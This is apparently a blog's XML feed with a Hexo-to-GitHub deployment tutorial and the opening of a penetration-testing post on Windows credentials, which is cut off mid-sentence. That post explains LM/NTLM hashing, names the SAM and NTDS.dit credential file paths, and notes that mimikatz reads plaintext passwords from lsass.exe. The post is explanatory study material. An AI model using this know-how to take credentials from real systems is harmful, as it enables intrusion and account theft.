%&#125;</span><br></pre></td></tr></table></figure><p>refer:</p><blockquote><ul><li><a href="https://butterfly.js.org/posts/4aa8abbe/#timeline">Butterfly 安装文档(三) 主题配置-1</a></li><li><a href="https://www.jianshu.com/p/b9e73c881729">Hexo 集成 Valine 评论系统</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-在GitHub部署hexo个人博客</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>由于比较懒不想操心博客的运维，而且腾讯云的服务器也快到期了，就先将Blog部署在GitHub上吧。</p><h1 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h1><p>hexo是一款快速、简洁且高效的博客框架，支持markdown写作（选择hexo的另一个原因），可以快速的生成静态网页，而且插件丰富。优点还是不少，就不一一赘述。附上官网链接。</p><blockquote><p><a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p></blockquote><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>安装 Hexo 相当简单，只需要先安装node.js和git（git安装方法自行百度）</p><blockquote><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li><li><a href="https://blog.csdn.net/antma/article/details/86104068">node.js安装参考这位大佬的教程</a></li></ul></blockquote><ol><li>npm安装hexo包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完hexo包可用<code>npm hexo-cli -v</code>查看版本，相应的目录下会有变化</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142002229.png" alt="image-20220814200222125" style="zoom:50%;" /><ol start="2"><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>，执行命令</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141958704.png" alt="image-20220814195830542" style="zoom:50%;" /><ol start="3"><li>开始建站，执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init .\myblog</span><br><span class="line">cd myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142012267.png" alt="image-20220814201251111" style="zoom:50%;" /><blockquote><p>这些目录里面放了什么文件可以参考<a href="https://hexo.io/zh-cn/docs/setup">官方文档</a></p></blockquote><h1 id="使用hexo创作"><a href="#使用hexo创作" class="headerlink" title="使用hexo创作"></a>使用hexo创作</h1><ol><li>新建FirstBlog，执行下面命令后，会自动在<code>myblog\source\\_posts</code>目录下创建名为<code>firtblog.md</code>的文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;FirstBlog&quot;</span></span><br><span class="line">或者简写为</span><br><span class="line">hexo n <span class="string">&quot;FirstBlog&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142028651.png" alt="image-20220814202817526" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142030299.png" alt="image-20220814203052183" style="zoom:50%;" /><ol start="2"><li>hexo渲染markdown文件，生成html等静态页面：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">或者</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>生成的文件都在<code>myblog\public</code>目录下</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142036923.png" alt="image-20220814203631732" style="zoom:50%;" /><ol start="3"><li>本地启动服务测试一下：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line">或者</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142038525.png" alt="image-20220814203848381" style="zoom:50%;" /><blockquote><p>这个服务开启的端口可以myblog\node_modules&#x2F;hexo-server&#x2F;index.js 文件中修改(因为有时候存在端口占用的情况)</p></blockquote><p>这个时候可以看到，成功了，但是略丑~，不急，后面可以换主题美化-</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142044320.png" alt="image-20220814204418980" style="zoom:50%;" /><h1 id="GitHub部署Blog"><a href="#GitHub部署Blog" class="headerlink" title="GitHub部署Blog"></a>GitHub部署Blog</h1><ol><li>先在GitHub上创立一个仓库，单击new~，：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142017620.png" alt="image-20220814201720473" style="zoom:50%;" /><ol start="2"><li>Repository name设为<code>Yourname.github.io</code>，其他默认即可</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142021969.png" alt="image-20220814202142829" style="zoom:50%;" /><p>可以在setting中查看是否成功，若成功会显示url：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142213278.png" alt="image-20220814221305122" style="zoom: 33%;" /><ol start="3"><li>打开<code>myblog\\_config.yml</code>这个文件，可以自行配置，参数太多不一一讲解。需要注意的是deploy选项</li></ol><blockquote><p>同理参考官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142048690.png" alt="image-20220814204826516" style="zoom:50%;" /><p>找到deploy选项：</p><blockquote><ul><li><p>同理可以参考官方文档：<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p></li><li><p><strong>注意yaml文件中的缩进</strong>：YAML依靠缩进来确定元素间的从属关系。因此，请确保每个deployer的缩进长度相同，并且使用空格缩进。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://bitbucket.org/John/john.bitbucket.io  #修改为自己GitHub仓库的url</span><br><span class="line">  branch: main#主分支，因人而异</span><br></pre></td></tr></table></figure><ol start="4"><li>git安装部署插件 <a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><ol start="5"><li>重新生成站点文件并推送至远程库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line">解释：</span><br><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo generate  #渲染 生成静态文件</span><br><span class="line">hexo deploy       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><ol start="6"><li>打开浏览器，输入自己的url：<a href="https://11pmsleep.github.io/">https://11pmsleep.github.io/</a> 就可以看到是否成功：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142207744.png" alt="image-20220814220707328" style="zoom: 33%;" /><h1 id="换个好看的主题"><a href="#换个好看的主题" class="headerlink" title="换个好看的主题~"></a>换个好看的主题~</h1><blockquote><p>换主题同样是参考文档：<a href="https://hexo.io/zh-cn/docs/themes">https://hexo.io/zh-cn/docs/themes</a></p><p>总而言之~文档里什么都有</p></blockquote><p>我选用的是<a href="https://butterfly.js.org/posts/21cfbf15/">butterfly</a>，因为这个名字很喜欢</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>在myblog目录下git拉取主题文件即可</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line">如果需更新，主题目录下 git pull即可</span><br><span class="line">在myblog\themes目录下可以看到新增主题butterfly</span><br></pre></td></tr></table></figure><ol start="2"><li>应用主题</li></ol><p>在myblog的目录下 _config.yml，把主题改为主题目录的名字butterfly</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151501667.png" alt="image-20220815150108479" style="zoom:50%;" /><ol start="3"><li>该主题需要我们额外安装插件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你没有 pug 以及 stylus 的渲染器，请下载安装：</span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><ol start="4"><li>最后重新加载和推送一下就可以看到成果了~~</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">或者直接hexo generate --deploy也是一样的。 Hexo 在生成完毕后自动部署网站</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151518872.png" alt="image-20220815151820608" style="zoom: 33%;" /><p>更详细的配置参考butterfly官方文档吧~</p><h2 id="其他主题推荐"><a href="#其他主题推荐" class="headerlink" title="其他主题推荐"></a>其他主题推荐</h2><blockquote><p>4<a href="https://blinkfox.github.io/">https://blinkfox.github.io/</a></p><p>4<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>4<a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>3.5<a href="https://dogzi.fun/">https://dogzi.fun/</a></p><p>3.5<a href="https://github.com/shen-yu/hexo-theme-ayer">https://github.com/shen-yu/hexo-theme-ayer</a></p><p>3<a href="https://zhwangart.com/">https://zhwangart.com/</a></p><p>3<a href="https://liuyib.github.io/">https://liuyib.github.io/</a>支持多关键词搜索</p><p>3<a href="https://yuang01.github.io/">https://yuang01.github.io/</a>有弹幕</p><p>2.5<a href="https://molunerfinn.com/">https://molunerfinn.com/</a><a href="https://github.com/Molunerfinn/hexo-theme-melody">https://github.com/Molunerfinn/hexo-theme-melody</a></p><p>2.5<a href="http://fech.in/">http://fech.in/</a><a href="https://github.com/Fechin/hexo-theme-diaspora">https://github.com/Fechin/hexo-theme-diaspora</a></p><p>2<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></p><p>1.5<a href="https://haojen.github.io/Claudia-theme-blog/">https://haojen.github.io/Claudia-theme-blog/</a></p><p>1<a href="https://volantis.js.org/examples/">https://volantis.js.org/examples/</a><a href="https://github.com/volantis-x/hexo-theme-volantis">https://github.com/volantis-x/hexo-theme-volantis</a></p><p>1<a href="https://github.com/Chorer/hexo-theme-PureBlue">https://github.com/Chorer/hexo-theme-PureBlue</a></p><p>1<a href="https://shuoit.net/">https://shuoit.net/</a></p><p>0.5<a href="https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/">https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/</a></p><p>0.5<a href="https://mser.xyz/">https://mser.xyz/</a></p><p><a href="http://ghaseminya.ir/">http://ghaseminya.ir/</a></p></blockquote><h1 id="refer："><a href="#refer：" class="headerlink" title="refer："></a>refer：</h1><blockquote><ul><li><p><a href="https://hexo.io/docs/troubleshooting.html#Git-Deployment-Problems">故障排错参考官方文档</a></p></li><li><p><a href="https://butterfly.js.org/posts/dc584b87/">butterfly安装文档</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/2024117">hexo-butterfly-搜索系统引入</a></p></li><li><p><a href="https://www.cnblogs.com/yyyzyyyz/p/15542401.html">hexo-butterfly魔改记录</a></p></li><li><p><a href="https://www.jianshu.com/p/0b1fccce74e0">利用Hexo在多台电脑上提交和更新github pages博客</a></p></li><li><p>巨好用：<a href="https://blog.eson.org/pub/e2f6e239/#:~:text=hexo-auto-category%20%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%20%28Markdown%29%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%EF%BC%8C%E5%8D%B3%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90,markdown%20%E7%9A%84front-matter%E4%B8%AD%E7%9A%84%20categories%20%E5%8F%98%E9%87%8F%E3%80%82">【Hexo插件系列】日志的自动分类插件 hexo-auto-category</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x25 - Windows密码凭证获取</title>
      <link href="/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>我们黑进内网后，最直接获取权限的方法自然是直接获取用户凭证。</p><h1 id="Windows-HASH"><a href="#Windows-HASH" class="headerlink" title="Windows HASH"></a>Windows HASH</h1><h2 id="HASH简介"><a href="#HASH简介" class="headerlink" title="HASH简介"></a>HASH简介</h2><p>hash ，一般翻译做散列，或音译为哈希，所谓哈希，就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。</p><p>这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p><h2 id="windows-HASH简介"><a href="#windows-HASH简介" class="headerlink" title="windows HASH简介"></a>windows HASH简介</h2><p>Windows  加密过的密码口令，我们称之为 hash<br>Windows  系统使用两种方法对用户的密码进行哈希处理，它们分别是 <strong>LAN Manager（LM） 哈希</strong>和 <strong>NT LAN Manager（NTLM）  哈希</strong>。<br>现在已经有了更新的 <strong>NTLMv2  以及 Kerberos</strong>  验证体系。</p><blockquote><p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p></blockquote><h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><h3 id="LM-HASH简介"><a href="#LM-HASH简介" class="headerlink" title="LM-HASH简介"></a>LM-HASH简介</h3><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法，是一种较古老的Hash，在LAN Manager协议中使用，<strong>非常容易通过暴力破解获取明文凭据</strong>。<br>它只有唯一一个版本且一直用到了 NT LAN Manager（NTLM） 哈希的出现，在 Windows XP &#x2F; Windows Server 2003  之前， 它是Windows上占主导地位的密码存储算法。<br>从 Windows Vista &#x2F; Windows Server 2008  开始，默认情况下已禁用该算法。<br><strong>LM  算法是在 DES  基础上实现的，不区分字母大小写。</strong></p><h3 id="LM-HASH生成原理"><a href="#LM-HASH生成原理" class="headerlink" title="LM-HASH生成原理"></a>LM-HASH生成原理</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290753428.png" alt="image-20220729075336294"></p><p>假设用户密码为：password</p><ol><li>用户的密码被限制为<strong>最多14个字符</strong>。</li><li>将用户密码所有字符转换为<strong>大写</strong>： PASSWORD</li><li>密码转换为<strong>16进制字符串</strong>，，密码长度不足14个字符将<strong>用0填充到14个字符</strong></li><li>这14个字符将被<strong>分成两半</strong>： PASSWOR D000000</li><li>每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7位为一组末尾加0（奇偶校验位)，组成新的编码（str_to_key()函数处理）,因此结果为64位： 1101000-&gt; 1101000 0 ，在将这些奇偶校验位相拼接之后，分别作为DES key。</li><li>分别用生成的两个密钥作为key 对 <strong><code>KGS!@#$%</code></strong>  进行DES加密： PASSWOR &#x3D;E52CAC67419A9A22<br> D000000 &#x3D; 4A3B108F3FA6CB6D</li><li>将加密后的两组拼接在一起，得到LM HASH值： E52CAC67419A9A22 4A3B108F3FA6CB6D</li></ol><h3 id="使用python得到LM-HASH值："><a href="#使用python得到LM-HASH值：" class="headerlink" title="使用python得到LM HASH值："></a>使用python得到LM HASH值：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;from passlib.hash import lmhash;print(lmhash.hash(&#x27;password&#x27;))&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import binascii</span><br><span class="line">from pyDes import *</span><br><span class="line">def DesEncrypt(str, Des_Key):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=None)</span><br><span class="line">    EncryptStr = k.encrypt(str)</span><br><span class="line">    return binascii.b2a_hex(EncryptStr)</span><br><span class="line">def group_just(length,text):</span><br><span class="line">    # text 00110001001100100011001100110100001101010011011000000000</span><br><span class="line">    text_area = re.findall(r&#x27;.&#123;%d&#125;&#x27; % int(length), text) # [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span><br><span class="line">    text_area_padding = [i + &#x27;0&#x27; for i in text_area] #[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span><br><span class="line">    hex_str = &#x27;&#x27;.join(text_area_padding) # 0011000010011000100011000110011001000010101010001101100000000000</span><br><span class="line">    hex_int = hex(int(hex_str, 2))[2:].rstrip(&quot;L&quot;) #30988c6642a8d800</span><br><span class="line">    if hex_int == &#x27;0&#x27;:</span><br><span class="line">        hex_int = &#x27;0000000000000000&#x27;</span><br><span class="line">    return hex_int</span><br><span class="line">def lm_hash(password):</span><br><span class="line">    # 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span><br><span class="line">    pass_hex = password.upper().encode(&quot;hex&quot;).ljust(28,&#x27;0&#x27;) </span><br><span class="line">#3132333435360000000000000000</span><br><span class="line">    print(pass_hex) </span><br><span class="line">    # 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span><br><span class="line">    left_str = pass_hex[:14] #31323334353600</span><br><span class="line">    right_str = pass_hex[14:] #00000000000000</span><br><span class="line">    left_stream = bin(int(left_str, 16)).lstrip(&#x27;0b&#x27;).rjust(56, &#x27;0&#x27;) # 00110001001100100011001100110100001101010011011000000000</span><br><span class="line">    right_stream = bin(int(right_str, 16)).lstrip(&#x27;0b&#x27;).rjust(56, &#x27;0&#x27;) # 00000000000000000000000000000000000000000000000000000000</span><br><span class="line">    # 3. 再分7bit为一组,每组末尾加0，再组成一组</span><br><span class="line">    left_stream = group_just(7,left_stream) # 30988c6642a8d800</span><br><span class="line">    right_stream = group_just(7,right_stream) # 0000000000000000</span><br><span class="line">    # 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span><br><span class="line">    left_lm = DesEncrypt(&#x27;KGS!@#$%&#x27;,left_stream) #44efce164ab921ca</span><br><span class="line">    right_lm = DesEncrypt(&#x27;KGS!@#$%&#x27;,right_stream) # aad3b435b51404ee</span><br><span class="line">    # 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span><br><span class="line">    return left_lm + right_lm</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    hash = lm_hash(&quot;123456&quot;)</span><br></pre></td></tr></table></figure><h3 id="LM-HASH缺点"><a href="#LM-HASH缺点" class="headerlink" title="LM-HASH缺点"></a>LM-HASH缺点</h3><ol><li>密码长度最大只能为14个字符</li><li>密码不区分大小写 </li><li>如果密码强度是小于7位，那么第二个分组加密后的结果肯定是 aad3b435b51404ee ，如果我们看到 lm hash 的结尾是 aad3b435b51404ee ，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7+7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于14个字符的密码的理论强度</li><li>DES密码强度不高</li></ol><h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM-HASH"></a>NTLM-HASH</h2><h3 id="NTLM-HASH简介"><a href="#NTLM-HASH简介" class="headerlink" title="NTLM-HASH简介"></a>NTLM-HASH简介</h3><p>NT LAN Manager（NTLM） 哈希是Windows系统认可的另一种算法，用于替代古老的LM-Hash，一般指Windows系统下 <strong>Security Account Manager（SAM） 中保存的用户密码hash</strong>，在 Windows Vista&#x2F;Windows 7&#x2F;Windows Server 2008 以及后面的系统中，NTLM哈希算法默认启用。</p><h3 id="NTLM-HASH生成原理"><a href="#NTLM-HASH生成原理" class="headerlink" title="NTLM-HASH生成原理"></a>NTLM-HASH生成原理</h3><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行 Unicode 编码。</li><li>使用 MD4 摘要算法对 Unicode  编码数据进行 Hash  计算</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import hashlib,binascii;print binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-16le&#x27;)).digest())&quot;</span><br><span class="line"></span><br><span class="line">python3 -c &quot;import hashlib,binascii;print(binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-</span><br><span class="line">16le&#x27;)).digest()).decode())&quot;</span><br></pre></td></tr></table></figure><h2 id="HASH格式"><a href="#HASH格式" class="headerlink" title="HASH格式"></a>HASH格式</h2><p>Windows  的系统密码 hash  默认情况下一般由两部分组成：第一部分是 LM-hash ，第二部分是 NTLM-hash 。<br>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290800924.png" alt="image-20220729080026827"></p><p>前面三个系统，当密码超过14位的时候会采用NTLM加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名称:RID:LM-HASH值:NTLM-HASH值</span><br><span class="line">test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</span><br></pre></td></tr></table></figure><p>前一部分是LM Hash，后一部分是NTLM Hash</p><p>当LM Hash是 AAD3B435B51404EEAAD3B435B51404EE  这表示 空密码或者是未使用LM_HASH</p><h3 id="sid和rid"><a href="#sid和rid" class="headerlink" title="sid和rid"></a>sid和rid</h3><ul><li>rid是系统对用户的唯一标识。就和sid一样。</li><li>我们拿到rid后，就可以大概的判断现在的用户大概的权限是什么</li><li>在计算机中中sid前面若干位都是相同的！只有最后面的rid是不同的！</li><li>系统自带的用户其rid都在1000内，用户自建的用户rid在1000以上</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sid:</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">rid:(即sid末尾的三位或者四位数字)：</span><br><span class="line">500</span><br><span class="line">503</span><br><span class="line">1035</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统用户账户的信息</span><br><span class="line">wmic useraccount list brief </span><br><span class="line"></span><br><span class="line">C:\Users\86063&gt;wmic useraccount list brief</span><br><span class="line">AccountType  Caption                   Domain  FullName  Name                SID</span><br><span class="line">512          ALVIN\Administrator       ALVIN             Administrator       S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">512          ALVIN\DefaultAccount      ALVIN             DefaultAccount      S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">512          ALVIN\Guest               ALVIN             Guest               S-1-5-21-1963647555-2248327119-2118898007-501</span><br><span class="line">512          ALVIN\Visitor             ALVIN             Visitor             S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">512          ALVIN\WDAGUtilityAccount  ALVIN             WDAGUtilityAccount  S-1-5-21-1963647555-2248327119-2118898007-504</span><br><span class="line">512          ALVIN\华年                ALVIN   Alvin Li  华年                S-1-5-21-1963647555-2248327119-2118898007-1001</span><br></pre></td></tr></table></figure><h2 id="HASH存储位置"><a href="#HASH存储位置" class="headerlink" title="HASH存储位置"></a>HASH存储位置</h2><p>windows hash  一般存储在两个地方：</p><ul><li>SAM  文件，存储在本机，对应本地用户</li><li>NTDS.DIT  文件，存储在域控上，对应域用户</li></ul><p>文件位置：(得要用工具查看)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM：</span><br><span class="line">C:\windows\system32\config\SAM</span><br><span class="line">NTDS.DIT：得到此文件，即可拿下域控</span><br><span class="line">C:\windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure><h1 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备（后面讲到域的时候，会专门讲）</li></ul><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><ol><li>用户输入密码</li><li>系统收到密码后将用户输入的密码计算成NTLM Hash</li><li>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对</li><li>匹配则登陆成功，不匹配则登陆失败</li></ol><p>NTLM哈希，是一种单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。</p><p>更具体体会上面的步骤：</p><ul><li>我们Windows登录界面是由一个叫winlogon.exe的进程产生（也就是通俗来讲的登陆界面），用户在该进程中输入的密码交由lsass.exe处理</li><li><strong>本地认证中用来处理用户输入密码的进程为 lsass.exe  ,密码会在这个进程中明文保存，供该进程将密码计算成 NTLM Hash  与 sam  进行比对，我们使用 mimikatz  来获取的明文密码，便是在这个进程中读取到的</strong></li><li>lsass.exe(本地安全授权进程local security authority process)</li></ul><p>大致的运算流程为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户密码 -&gt; HEX编码 -&gt; Unicode编码 -&gt; MD4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install passlib</span><br><span class="line">&gt;&gt;&gt; from passlib.hash import nthash</span><br><span class="line">&gt;&gt;&gt; print(nthash.hash(&#x27;admin&#x27;))</span><br><span class="line">209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制，可以以Windows的远程桌面（rdp协议）为例<br>NTLM  协议的认证过程分为三步，也叫<strong>挑战&#x2F;响应机制</strong>：</p><h3 id="1、协商"><a href="#1、协商" class="headerlink" title="1、协商"></a>1、协商</h3><p>双方确定使用的协议版本， NTLM  存在V1和V2两个版本，即 Net-NTLM v1 hash 、 Net-NTLM v2 hash ，具体区别就是加密方式不同</p><p>在 NTLM 认证中， NTLM 响应分为 NTLM v1 ， NTLMv2 ， NTLM session v2 三种协议，不同协议使用不同格式的 Challenge  和加密算法</p><h3 id="2、质询"><a href="#2、质询" class="headerlink" title="2、质询"></a>2、质询</h3><p>挑战（Chalenge）&#x2F; 响应（Response）认证机制的核心</p><ol><li>客户端向服务器端发送用户信息(仅有用户名)请求</li><li>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为” Challenge “， 然后使用登录用户名对应的 NTLM Hash 加密Challenge(16位随机字符)， 生成 Challenge1 保存在内存中。同时，生成 Challenge1后，将 Challenge (16位随机字符)明文发送给客户端。</li><li>客户端接受到 Challenge 后，使用自己提供的账户的密码转换成对应的 NTLM Hash ，然后使用这个 NTLM Hash 加密 Challenge 生成 Response ，然后将 Response 发送至服务器端。</li></ol><h3 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h3><p>在质询完成后，验证结果，是认证的最后一步。<br>服务端收到客户端发送的 Response 后，与之前保存在内存中的 Channelge1 比较，如果相等认证通过</p><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 <strong>Net NTLM Hash</strong> （但是呢 